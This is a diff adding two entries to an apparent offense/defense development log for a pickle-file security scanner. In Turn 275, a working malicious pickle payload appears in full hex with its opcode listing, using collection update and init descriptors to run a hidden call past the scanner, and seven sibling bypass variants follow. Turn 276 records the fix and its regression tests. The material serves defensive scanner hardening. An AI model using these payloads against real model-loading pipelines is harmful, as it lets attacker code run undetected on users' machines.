@@ -18471,3 +18471,251 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3836 passed, 1022 skipped, 21 warnings in 46.92s
 ```
+
+## Turn 275 - Bypass via residual mapping and collection init/update descriptors
+
+Offensive turn after the Turn 274 defense. The finite call-graph model now
+covers many iterable consumers and public `operator` protocol helpers, but
+clean collection method descriptors can still consume a tracked
+`iter(callable, sentinel)` and execute the hidden zero-argument call.
+
+Representative payload:
+
+```python
+collections.ChainMap.update(
+    collections.ChainMap(),
+    iter(builtins.help, "stop"),
+)
+```
+
+The proof payload memoizes the `ChainMap`, calls `ChainMap.update(...)`, pops
+the `None` method result, and returns the mutated `ChainMap` so the side effect
+is visible:
+
+```text
+payload_len 116
+payload_hex 80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c0b636f6c6c656374696f6e738c08436861696e4d617093295294308c0b636f6c6c656374696f6e738c0f436861696e4d61702e75706461746593286801680074523068012e
+
+0: PROTO              4
+18: STACK_GLOBAL       # builtins.iter
+35: STACK_GLOBAL       # builtins.help
+43: REDUCE             # iter(help, "stop")
+44: MEMOIZE            # memo[0] = call iterator
+71: REDUCE             # collections.ChainMap()
+72: MEMOIZE            # memo[1] = ChainMap()
+104: STACK_GLOBAL      # collections.ChainMap.update
+111: REDUCE            # ChainMap.update(memo[1], memo[0]), drains rhs
+112: POP
+113: BINGET            # return memo[1]
+115: STOP
+```
+
+Scanner proof:
+
+```text
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18, False),
+  ('builtins', 'help', 35, False),
+  ('collections', 'ChainMap', 69, False),
+  ('collections', 'ChainMap.update', 104, False),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'ChainMap', 0, 71),
+  ('collections', 'ChainMap.update', 2, 111),
+]
+```
+
+Runtime proof with a shadow `pydoc.py`:
+
+```text
+runtime_rc 0
+runtime_type ChainMap
+runtime_repr ChainMap({'owned-key': 'owned-value'})
+marker_exists True
+marker_text owned-by-chainmap-update
+```
+
+Sibling clean bypasses from the same source family:
+
+```text
+ChainMap.update
+  payload_len 116 scan clean findings 0 errors ()
+  runtime ChainMap ChainMap({'owned-key': 'owned-value'}) True owned-by-ChainMap.update
+
+defaultdict.update
+  payload_len 122 scan clean findings 0 errors ()
+  runtime defaultdict defaultdict(None, {'owned-key': 'owned-value'}) True owned-by-defaultdict.update
+
+OrderedDict.__init__
+  payload_len 124 scan clean findings 0 errors ()
+  runtime OrderedDict OrderedDict({'owned-key': 'owned-value'}) True owned-by-OrderedDict.__init__
+
+defaultdict.__init__
+  payload_len 125 scan clean findings 0 errors ()
+  runtime defaultdict defaultdict(None, {'owned-key': 'owned-value'}) True owned-by-defaultdict.__init__
+
+Counter.__init__
+  payload_len 116 scan clean findings 0 errors ()
+  runtime Counter Counter({'owned-value': 1}) True owned-by-Counter.__init__
+
+UserDict.__init__
+  payload_len 118 scan clean findings 0 errors ()
+  runtime UserDict {'owned-key': 'owned-value'} True owned-by-UserDict.__init__
+
+UserList.__init__
+  payload_len 118 scan clean findings 0 errors ()
+  runtime UserList ['owned-value'] True owned-by-UserList.__init__
+```
+
+Why it bypasses:
+
+- The native stack model correctly tracks `iter(help, "stop")` as a
+  `StackValue::CallIterator`.
+- Existing descriptor coverage includes `dict.__init__`, `dict.update`,
+  `OrderedDict.update`, `UserDict.update`, `UserList.extend`, `Counter.update`,
+  and `Counter.subtract`, but not the residual collection initialization and
+  update descriptors above.
+- These descriptors are clean imports and the scanner records only the visible
+  descriptor invocation. It does not emit the hidden `builtins.help()` call that
+  happens while the descriptor drains the iterable.
+- Direct `.__ior__` descriptors were also probed and execute, but they already
+  produce a suspicious scanner verdict, so they are not counted for this clean
+  bypass.
+
+Likely source-level defense:
+
+- Extend `method_descriptor_iterable_consumed_callable(...)` with exact
+  descriptor matches for collection initialization and mapping update:
+  `collections.ChainMap.update`, `collections.defaultdict.update`,
+  `collections.Counter.__init__`, `collections.OrderedDict.__init__`,
+  `collections.UserDict.__init__`, and `collections.UserList.__init__`.
+- Add a separate arity-specific case for
+  `collections.defaultdict.__init__(receiver, default_factory, iterable)`, where
+  the consumed iterator is argument 2.
+- Keep the rule reducer-local and receiver-aware enough to inspect only the
+  already-decoded reducer callable and argument tuple. This is the same source
+  behavior as the existing descriptor consumer table; it does not require new
+  package policy entries.
+
+Simplification note:
+
+- The next fix can reduce special-case drift by treating descriptor consumers as
+  a small table of `(module, name, consumed_argument_index, arity)` entries.
+  That would group `dict.update`, `OrderedDict.update`, `ChainMap.update`,
+  `UserDict.update`, and the `.__init__` consumers in one place while keeping
+  the hot path exact and bounded.
+
+Performance note:
+
+- The representative payload is 116 bytes.
+- Warm scan timing over 1000 runs was median `0.000070s`, p95 `0.000074s`,
+  and max `0.000749s`.
+
+## Turn 276 - Block residual collection init/update descriptors
+
+Defensive turn for the Turn 275 descriptor bypass. The fix keeps the block at
+the call-graph source: when a reducer invokes a known iterable-consuming method
+descriptor with a tracked `iter(callable, sentinel)` in the consumed argument
+slot, the scanner now emits the hidden zero-argument callable invocation.
+
+Focused change:
+
+```text
+collections.ChainMap.update(receiver, call_iterator) -> drains arg 1
+collections.defaultdict.update(receiver, call_iterator) -> drains arg 1
+collections.Counter.__init__(receiver, call_iterator) -> drains arg 1
+collections.OrderedDict.__init__(receiver, call_iterator) -> drains arg 1
+collections.UserDict.__init__(receiver, call_iterator) -> drains arg 1
+collections.UserList.__init__(receiver, call_iterator) -> drains arg 1
+collections.defaultdict.__init__(receiver, default_factory, call_iterator) -> drains arg 2
+```
+
+Boundary kept:
+
+```text
+collections.defaultdict.__init__(receiver, call_iterator) -> TypeError without advancing factory arg
+```
+
+Implementation note:
+
+- Replaced the fixed-arity descriptor `match` arms with a compact exact table:
+  `(module, descriptor_name, arity, consumed_argument_index)`.
+- The existing variable-arity set/frozenset descriptor family remains as a
+  separate rule because it consumes any iterable argument after the receiver.
+- Builtins aliases still route through the table with the same
+  `builtins`/`__builtin__`/`__builtins__` matching.
+
+Post-fix proof for the Turn 275 representative payload:
+
+```text
+payload_len 116
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('collections', 'ChainMap', 69),
+  ('collections', 'ChainMap.update', 104),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'ChainMap', 0, 71),
+  ('collections', 'ChainMap.update', 2, 111),
+  ('builtins', 'help', 0, 111),
+]
+finding DANGEROUS_CALL_GRAPH {
+  'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__', 'builtins.__import__'),
+}
+runtime_rc 0
+runtime_type ChainMap
+runtime_repr ChainMap({'owned-key': 'owned-value'})
+marker_exists True
+marker_text owned-by-chainmap-update
+```
+
+Regression coverage:
+
+- Added malicious positives for `ChainMap.update`, `defaultdict.update`,
+  `OrderedDict.__init__`, `defaultdict.__init__`, `Counter.__init__`,
+  `UserDict.__init__`, and `UserList.__init__`.
+- Added a clean runtime-proven negative for the `defaultdict.__init__` factory
+  slot, where a call iterator is rejected before it is advanced.
+
+Simplification note:
+
+- This consolidates fixed-arity descriptor consumers into one table, reducing
+  the drift that produced Turn 275. Future descriptor additions should be a
+  single table row when the arity and consumed argument index are fixed.
+
+Performance note:
+
+- Warm post-fix scan timing over 1000 runs: median `0.000147s`, p95
+  `0.000153s`, max `0.000268s`.
+- The table is small and checked only after the reducer callable and arguments
+  are already decoded.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted descriptor regressions
+32 passed in 1.14s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+129 passed in 3.01s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+167 passed in 4.55s
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3844 passed, 1022 skipped, 21 warnings in 38.98s
+```
